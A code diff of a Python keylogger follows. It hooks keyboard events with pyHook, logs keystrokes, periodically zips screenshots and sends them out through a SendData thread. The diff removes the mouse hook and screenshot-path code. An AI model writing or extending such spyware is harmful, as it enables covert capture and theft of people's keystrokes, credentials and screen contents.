@@ -48,12 +48,6 @@ keystroke = current_directory + os.sep + r'data\keystroke.txt'
 # current time
 current_time = time.asctime(time.localtime(time.time()))
 
-#current_system_time = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
-# scrernshot location
-screen_location = current_directory + os.sep + 'data' + os.sep + 'screenshot' + os.sep
-
-
-
 # save data to local keylogger
 def local(location, data):
     global buffer
@@ -155,11 +149,6 @@ class SendData(threading.Thread):
 
         return True
 
-def OnMouseEvent(event):
-    if event.Position:
-        screen()
-    return True
-
 def OnKeyboardEvent(event):
     global  buffer, keystroke, count
 
@@ -183,7 +172,6 @@ def OnKeyboardEvent(event):
 
     if count % 100 == 0:
         zipScreenshot()
-        local(keystroke, buffer)
         SendData('ZipScreenshot.zip').start()
 
     if count % 50 == 0:
@@ -206,9 +194,3 @@ hookKeyboard = pyHook.HookManager()
 hookKeyboard.KeyDown = OnKeyboardEvent
 hookKeyboard.HookKeyboard()
 pythoncom.PumpMessages()
-
-hm = pyHook.HookManager()
-hm.SubscribeMouseAllButtonsDown(OnMouseEvent)
-hm.HookMouse()
-pythoncom.PumpMessages()
-hm.UnhookMouse()
